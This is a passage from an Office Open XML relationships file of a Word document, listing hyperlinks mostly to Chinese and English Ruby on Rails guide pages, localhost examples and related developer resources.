Id="rId1117" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1118" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1119" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId110" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId112" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId114" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId115" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId116" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId117" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId118" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId119" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId760" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId761" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId762" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId763" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId764" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId765" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId766" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId767" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId768" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId769" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.infoq.com/articles/webber-rest-workflow" TargetMode="External"/><Relationship Id="rId71" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/lifo/docrails/tree/master/guides/code/getting_started" TargetMode="External"/><Relationship Id="rId72" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://railsinstaller.org" TargetMode="External"/><Relationship Id="rId73" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.rubyonrails.org/configuring.html" TargetMode="External"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://gembundler.com" TargetMode="External"/><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.rubyonrails.org/testing.html" TargetMode="External"/><Relationship Id="rId76" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.sqlite.org/" TargetMode="External"/><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/sstephenson/execjs" TargetMode="External"/><Relationship Id="rId78" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000" TargetMode="External"/><Relationship Id="rId440" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId441" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId442" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId443" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId444" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId445" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId446" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId447" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId448" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId449" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1120" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1122" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId1123" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rack.rubyforge.org/doc/" TargetMode="External"/><Relationship Id="rId1124" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rack.github.com" TargetMode="External"/><Relationship Id="rId1125" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://chneukirchen.org/blog/archive/2007/02/introducing-rack.html" TargetMode="External"/><Relationship Id="rId1126" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://m.onkey.org/ruby-on-rack-1-hello-rack" TargetMode="External"/><Relationship Id="rId1127" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://m.onkey.org/ruby-on-rack-2-the-builder" TargetMode="External"/><Relationship Id="rId1128" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://railscasts.com/episodes/151-rack-middleware" TargetMode="External"/><Relationship Id="rId1129" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId120" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId121" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId122" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId123" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId124" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId125" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId126" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/SchemaStatements.html" TargetMode="External"/><Relationship Id="rId127" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/TableDefinition.html" TargetMode="External"/><Relationship Id="rId128" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/Table.html" TargetMode="External"/><Relationship Id="rId129" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId770" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId771" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId772" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId773" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId774" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId775" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId776" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId777" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId778" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId779" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/debugging_rails_applications.html" TargetMode="External"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000" TargetMode="External"/><Relationship Id="rId81" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.rubyonrails.org/generators.html" TargetMode="External"/><Relationship Id="rId83" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.rubyonrails.org/migrations.html" TargetMode="External"/><Relationship Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000%EF%BC%8C%E5%B9%B6%E4%B8%94%E7%82%B9%E5%87%BB" TargetMode="External"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.png"/><Relationship Id="rId86" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_querying.html" TargetMode="External"/><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000/posts.json%EF%BC%8C%E4%BD%A0%E5%B0%86%E4%BC%9A%E7%9C%8B%E5%88%B0%E4%B8%80%E4%B8%AA" TargetMode="External"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/layouts_and_rendering.html" TargetMode="External"/><Relationship Id="rId450" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId451" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId452" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId453" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId454" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId455" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId456" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId459" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId457" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId458" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1130" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1131" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1132" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1133" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1134" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1135" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1136" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1137" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1138" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1139" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId130" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId131" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId132" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId133" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId134" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId135" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId136" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId137" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId138" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId139" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId900" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/3_0_release_notes.html" TargetMode="External"/><Relationship Id="rId901" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/command_line.html" TargetMode="External"/><Relationship Id="rId902" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://0.0.0.0:3000" TargetMode="External"/><Relationship Id="rId903" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000" TargetMode="External"/><Relationship Id="rId904" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000/greetings/hello" TargetMode="External"/><Relationship Id="rId905" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://api.rubyonrails.org/classes/ActiveRecord/ConnectionAdapters/TableDefinition.html" TargetMode="External"/><Relationship Id="rId906" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost:3000/high_scores" TargetMode="External"/><Relationship Id="rId907" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId908" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/testing.html" TargetMode="External"/><Relationship Id="rId909" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/rails_on_rack.html" TargetMode="External"/><Relationship Id="rId780" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://localhost/posts" TargetMode="External"/><Relationship Id="rId781" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://rubyforge.org/projects/ruby-debug/" TargetMode="External"/><Relationship Id="rId782" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://0.0.0.0:3000" TargetMode="External"/><Relationship Id="rId783" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/fauna/bleak_house/tree/master" TargetMode="External"/><Relationship Id="rId784" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/fauna/bleak_house/tree/master" TargetMode="External"/><Relationship Id="rId785" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://valgrind.org/" TargetMode="External"/><Relationship Id="rId786" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://blog.evanweaver.com/articles/2008/02/05/valgrind-and-ruby/" TargetMode="External"/><Relationship Id="rId787" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/josevalim/rails-footnotes" TargetMode="External"/><Relationship Id="rId788" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/ntalbott/query_trace/tree/master" TargetMode="External"/><Relationship Id="rId789" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/dan-manges/query_stats/tree/master" TargetMode="External"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/layouts_and_rendering.html" TargetMode="External"/><Relationship Id="rId91" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/association_basics.html" TargetMode="External"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/routing.html" TargetMode="External"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.png"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/index.html" TargetMode="External"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://railstutorial.org/book" TargetMode="External"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://groups.google.com/group/rubyonrails-talk" TargetMode="External"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="irc://irc.freenode.net/" TargetMode="External"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/migrations.html" TargetMode="External"/><Relationship Id="rId460" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId461" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId462" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId463" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId464" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId465" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId466" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId467" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId468" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId469" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_support_core_extensions.html" TargetMode="External"/><Relationship Id="rId1140" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1141" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1142" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1143" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1144" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1145" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1146" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1147" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1148" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId1149" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/generators.html" TargetMode="External"/><Relationship Id="rId140" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId141" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId142" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId143" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId144" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId145" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId146" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId147" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId148" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId149" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/active_record_validations_callbacks.html" TargetMode="External"/><Relationship Id="rId910" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://0.0.0.0:3000" TargetMode="External"/><Relationship Id="rId911" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId912" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId913" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId914" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId915" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" TargetMode="External"/><Relationship Id="rId916" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://guides.ruby-china.org/caching_with_rails.html" 